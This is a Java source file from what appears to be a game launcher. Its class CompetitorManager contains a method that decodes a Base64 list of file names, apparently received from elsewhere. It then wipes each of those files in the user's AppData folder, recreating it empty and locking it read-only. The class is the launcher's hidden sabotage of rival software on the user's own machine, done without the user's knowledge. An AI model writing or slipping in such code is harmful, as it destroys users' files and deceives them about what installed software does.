package relevant_craft.vento.r_launcher.manager.competitor;

import relevant_craft.vento.r_launcher.utils.Base64Utils;
import relevant_craft.vento.r_launcher.utils.OperatingSystem;

import java.io.File;
import java.io.IOException;

public class CompetitorManager {

    public static void doFuck(String information) {
        if (information.equalsIgnoreCase("false")) {
            return;
        }

        String[] files = Base64Utils.decode(information).split("<::>");
        if (files == null) {
            return;
        }

        for (int i=0; i < files.length; i++) {
            File file = new File(OperatingSystem.getCurrentPlatform().getAppdataDir() + File.separator + files[i]);
            if (file.exists()) {
                try {
                    file.delete();
                    file.createNewFile();
                    file.setReadOnly();
                } catch (IOException e) {}
            }
        }
    }

}
